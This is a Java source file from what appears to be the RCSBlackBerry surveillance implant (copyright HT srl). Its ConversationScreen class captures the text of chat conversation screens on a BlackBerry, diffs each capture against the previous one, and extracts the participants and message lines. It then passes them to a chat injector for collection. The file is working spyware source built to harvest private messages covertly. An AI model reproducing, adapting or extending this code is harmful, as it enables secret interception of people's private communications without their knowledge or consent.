//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2011
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/

package blackberry.injection.injectors.conversation;

import java.util.Vector;

import blackberry.Status;
import blackberry.debug.Check;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.injection.injectors.group.ChatGroupInjector;
import blackberry.utils.StringUtils;

public class ConversationScreen {
    //#ifdef DEBUG
    private static Debug debug = new Debug("ConvScreen", DebugLevel.VERBOSE); //$NON-NLS-1$
    //#endif

    // Vector<String>
    private static Vector parts;
    private static String partecipants;

    private String lastConversation = null;


    /**
     * retrieves the screen, if it's the conversation one, calls the copy and
     * parses the content
     * 
     * @param injector
     */
    public void getConversationScreen(String newConversation,
            ChatGroupInjector injector) {

        try {
            //#ifdef DEBUG
            debug.trace("getConversationScreen");
            //#endif
            
            // parse della conversazione.
            // result e' un vettore di stringhe
            Vector result = parseConversation(newConversation, lastConversation);
            lastConversation = newConversation;

            if (result != null) {
                //#ifdef DBC
                Check.asserts(result.size() == 2,
                        "wrong size result:  " + result.size()); //$NON-NLS-1$
                //#endif

                //#ifdef DEBUG
                debug.trace("getConversationScreen: extract vector elements"); //$NON-NLS-1$
                //#endif
                String partecipants = (String) result.elementAt(0);
                Vector lines = (Vector) result.elementAt(1);

                injector.addLines(partecipants, lines);

                if (Status.self().wantLight()) {
                    Debug.ledFlash(Debug.COLOR_YELLOW);
                }
            }

            /*
             * if (screen.getClass().getName().indexOf("UserInfoScreen") >= 0) {
             * if (Backlight.isEnabled()) { //FieldExplorer explorer = new
             * FieldExplorer(); //Vector textfields = explorer.explore(screen,
             * true); } }
             */
        } catch (Exception ex) {
            //#ifdef DEBUG
            debug.error("getConversationScreen: " + ex); //$NON-NLS-1$
            ex.printStackTrace();
            //#endif

        } 
        //#ifdef DEBUG
        debug.trace("getConversationScreen: end");
        //#endif
        return;
    }

    public static Vector parseConversation(String newConversation) {
        return parseConversation(newConversation, null);
    }

    /**
     * parse conversation
     * 
     * @param conversation
     * @param lastConversation2
     * @return Vector<String partecipants, Vector<String line> lines>
     */
    public static Vector parseConversation(String newConversation,
            String lastConversation) {

        //#ifdef DBC
        Check.requires(newConversation != null,
                "parseConversation, null newCoversation"); //$NON-NLS-1$
        //#endif

        //#ifdef DEBUG
        int lastLen = 0;
        if (lastConversation != null) {
            lastLen = lastConversation.length();
        }
        debug.trace("parseConversation new: " + newConversation.length() //$NON-NLS-1$
                + " last: " + lastLen); //$NON-NLS-1$
        //#endif

        String lineConversation = StringUtils.diffStrings(newConversation,
                lastConversation);
        boolean full;

        //#ifdef DEBUG
        debug.trace("parseConversation lineConversation: " + lineConversation); //$NON-NLS-1$
        //#endif

        //1g.3=Participants
        //Messages.getString("1g.3")
        if (lineConversation.startsWith("Participants")) { //$NON-NLS-1$
            full = true;
            //#ifdef DEBUG
            debug.trace("parseConversation: full"); //$NON-NLS-1$
            //#endif
            return parseFullConversation(newConversation);

        } else {
            full = false;
            //#ifdef DEBUG
            debug.trace("parseConversation: partial"); //$NON-NLS-1$
            //#endif
            return parseLinesConversation(lineConversation, 0);
        }
    }

    /**
     * parses partial conversation, containing only lines. this method requires
     * that the parseFull has already been called once.
     * 
     * @param conversation
     * @param posMessages
     * @return
     */
    private static Vector parseLinesConversation(String conversation,
            int posMessages) {
        try {
            //#ifdef DEBUG
            debug.trace("parseLinesConversation: " + conversation); //$NON-NLS-1$
            debug.trace("parseLinesConversation posMessages=" + posMessages); //$NON-NLS-1$
            //#endif

            //#ifdef DBC
            Check.requires(partecipants != null, "null partecipants"); //$NON-NLS-1$
            Check.requires(parts != null && parts.size() > 1, "null parts"); //$NON-NLS-1$
            //#endif
            Vector result = new Vector();

            int numLine = 1;

            Vector lines = new Vector();

            // per ogni linea
            //   se e' un inizio
            //       si elabora la last
            //       last = current.startAfter(partecipant)
            //   senno' 
            //       last += current
            // elabora la last
            String lastLine = ""; //$NON-NLS-1$
            while (true) {
                String currentLine = StringUtils.getNextLine(conversation,
                        posMessages);
                if (currentLine == null) {
                    //#ifdef DEBUG
                    debug.trace("parseLinesConversation null line, posMessage: " //$NON-NLS-1$
                            + posMessages);
                    //#endif
                    break;
                }
                posMessages += currentLine.length() + 1;

                //if (numLine < 5) {
                //#ifdef DEBUG
                debug.trace("line " + numLine + " : " + currentLine); //$NON-NLS-1$ //$NON-NLS-2$
                //#endif
                //}
                numLine += 1;

                int lineStart = searchPartecipantIter(currentLine);

                if (lineStart > 0) {
                    // c'e' un partecipante
                    // elabora la linea precedente
                    //#ifdef DEBUG
                    debug.trace("parseConversation part line: " + currentLine); //$NON-NLS-1$
                    //#endif
                    String ll = lastLine.trim();
                    if (!StringUtils.empty(ll)) {
                        //#ifdef DEBUG
                        debug.trace("parseLinesConversation adding last line: " //$NON-NLS-1$
                                + ll);
                        //#endif
                        lines.addElement(ll);
                    } else {
                        //#ifdef DEBUG
                        debug.trace("parseLinesConversation last: empty line"); //$NON-NLS-1$
                        //#endif
                    }
                    lastLine = currentLine;
                } else {
                    //#ifdef DEBUG
                    debug.trace("parseConversation increasing line: " //$NON-NLS-1$
                            + currentLine);
                    //#endif
                    lastLine += " " + currentLine; //$NON-NLS-1$
                }

            }
            //adding last line
            String ll = lastLine.trim();
            if (!StringUtils.empty(ll)) {
                //#ifdef DEBUG
                debug.trace("parseLinesConversation adding last line: " + ll); //$NON-NLS-1$
                //#endif
                lines.addElement(ll);
            }

            //agent.add(partecipants, lines);
            //#ifdef DEBUG
            debug.info("parseLinesConversation num lines: " + lines.size() //$NON-NLS-1$
                    + "/" + numLine); //$NON-NLS-1$
            //#endif
            result.addElement(partecipants);
            result.addElement(lines);

            //#ifdef DBC
            Check.ensures(result.size() == 2, "wrong size result"); //$NON-NLS-1$
            //#endif
            return result;
        } catch (Exception ex) {
            //#ifdef DEBUG
            debug.error("parseConversation: " + ex); //$NON-NLS-1$
            //#endif
            return null;
        }
    }

    /**
     * parses a full conversation. gets the partecipants and retrives the lines.
     * 
     * @param conversation
     * @return
     */
    public static Vector parseFullConversation(String conversation) {
        // Participants:
        // -------------
        // Torcione, Whiteberry
        //
        // Messages:
        // ---------
        // Torcione: Scrivo anche a he
        // e poi vado a capo
        // diverse volte
        // Whiteberry: grazie

        try {
            int pos = conversation.indexOf("-------------"); //$NON-NLS-1$
            //#ifdef DBC
            Check.asserts(pos >= 0, "no delimiter found"); //$NON-NLS-1$
            //#endif

            int partStart = conversation.indexOf("\n", pos) + 1; //$NON-NLS-1$
            int partSep = conversation.indexOf(", ", partStart); //$NON-NLS-1$
            int partEnd = conversation.indexOf("\n", partSep); //$NON-NLS-1$

            partecipants = conversation.substring(partStart, partEnd).trim();
            parts = StringUtils.splitVector(partecipants, ", "); //$NON-NLS-1$

            //#ifdef DBC
            Check.asserts(!StringUtils.empty(partecipants),
                    "empty partecipants"); //$NON-NLS-1$
            Check.asserts(parts.size() >= 2, "wrong size parts"); //$NON-NLS-1$
            //#endif

            // lines start at line 6
            int posMessages = StringUtils.getLinePos(conversation, 6);

            // actual line parsing
            return parseLinesConversation(conversation, posMessages);
        } catch (Exception ex) {
            //#ifdef DEBUG
            debug.error("parseConversation: " + ex); //$NON-NLS-1$
            //#endif
            return null;
        }
    }

    // se ci sono i partecipanti, restituisce la posizione dopo il :
    // senno 0
    private static int searchPartecipantsDelimiter(String currentLine) {
        int pos = 0;

        pos = currentLine.indexOf(": "); //$NON-NLS-1$
        if (pos > 0) {
            String part = currentLine.substring(0, pos);
            if (parts.contains(part)) {
                return pos + 2;
            }
        }

        return 0;
    }

    /**
     * check for partecipants looking at the parts vector. safer method than
     * searchPartecipantsDelimiter
     * 
     * @param currentLine
     * @return
     */
    private static int searchPartecipantIter(String currentLine) {
        //#ifdef DBC
        Check.requires(parts != null && parts.size() > 1, "empty parts"); //$NON-NLS-1$
        //#endif

        int pos = 0;

        for (int i = 0; i < parts.size(); i++) {
            String part = (String) parts.elementAt(i);
            pos = currentLine.indexOf(part);
            if (pos == 0) {
                return part.length();
            }
        }
        return 0;
    }

}
